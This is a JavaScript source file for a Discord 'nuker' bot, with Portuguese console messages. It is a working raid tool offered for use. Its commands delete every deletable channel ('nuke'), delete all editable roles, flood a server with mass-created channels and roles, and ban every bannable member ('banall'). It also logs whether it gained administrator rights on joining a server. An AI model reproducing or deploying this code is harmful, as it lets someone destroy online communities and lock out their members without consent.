const Discord = require('discord.js');
const client = new Discord.Client();
const config = require('./config.json')
var colors = require('colors');
const { clear } = require('console');
const { start } = require('repl');


client.on('ready', () => {
    clear()
    console.log(`Logado em ${client.user.tag}\nCréditos: [ ! iNull#0001 ]`.bgBlack);
});

client.on('message', msg => {
    if (msg.content.startsWith(config.prefix + 'nuke')) {
        msg.guild.channels.cache.forEach((canal) => {
            if (canal.deletable) {
                canal.delete().then(canal => {
                    console.log(`[+] ${canal.name} foi deletado do Servidor [ ${msg.guild.name} ]`.green)
                })
            }
            else {
                console.log(`[-] Falha ao deletar ${canal.name} do Servidor [ ${msg.guild.name} ]`.red)
            }
        })
    }

    if (msg.content.startsWith(config.prefix + 'spam')) {
        const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
        const nome = args[2]
        const quantidade = args[1]
        if (!nome) return;
        if (isNaN(quantidade)) return;
        if (!msg.guild.me.permissions.has('MANAGE_CHANNELS')) return console.log(`Não possuo a permissão MANAGE_CHANNELS no Servidor [ ${msg.guild.name} ]`.red)
        for (var loop = 0; loop < quantidade; loop++) {
            const canal = msg.guild.channels.create(nome, {
                type: "text",
            }).then(canal => {
                console.log(`[+] O Canal ${canal.name.toUpperCase()} foi criado com Sucesso no Servidor [ ${msg.guild.name} ]`.green)
            })
        }
    }

    if (msg.content.startsWith(config.prefix + 'sroles')) {
        const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
        msg.guild.roles.cache.forEach((cargo) => {
            if(cargo.editable && cargo.name !== '@everyone') {
                cargo.delete().then(cargo => {
                    console.log(`[+] O Cargo ${cargo.name} foi deletado do Servidor [ ${msg.guild.name} ]`.green)
                })
              }
            else {
                console.log(`[-] Falha ao deletar o Cargo ${cargo.name} do Servidor ${msg.guild.name}`.red)
            }
        })
    }

    if (msg.content.startsWith(config.prefix + 'droles')) {
        const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
        const nome = args[2]
        const quantidade = args[1]
        if (!nome) return;
        if (isNaN(quantidade)) return;
        if (!msg.guild.me.permissions.has('MANAGE_ROLES')) return console.log(`Não possuo a permissão MANAGE_CHANNELS no Servidor [ ${msg.guild.name} ]`.red)
        for (var loop = 0; loop < quantidade; loop++) {
            const cargo = msg.guild.roles.create({
                data: {
                    name: nome,
                    color: "RED"
                }
            }).then(canal => {
                console.log(`[+] O Canal ${canal.name.toUpperCase()} foi criado com Sucesso no Servidor [ ${msg.guild.name} ]`.green)
            })
        }
    }

    if (msg.content.startsWith(config.prefix + 'banall')) {
        msg.guild.members.cache.forEach((usuario) => {
            if (usuario.bannable) {
                usuario.ban({ reason: "Developed by Null <3" })
                console.log(`[+] O Usuário ${usuario.user.tag} foi banido do Servidor [ ${msg.guild.name} ]`.green)
            }
            else {
                console.log(`[-] Falha ao banir o Usuário ${usuario.user.username} do Servidor [ ${msg.guild.name}]`.red)
            }
        })
    }
});

client.on('guildCreate', (guild, client) => {
    console.log(`[+] O Bot foi adicionado no Servidor [ ${guild.name} ]`.rainbow)
    if (guild.me.permissions.has(`ADMINISTRATOR`)) {
        console.log(`[+] O Client ${client.user.name} possui permissão de Administrador no Servidor [ ${guild.name} ]`.green)
    }
})

client.login(config.token);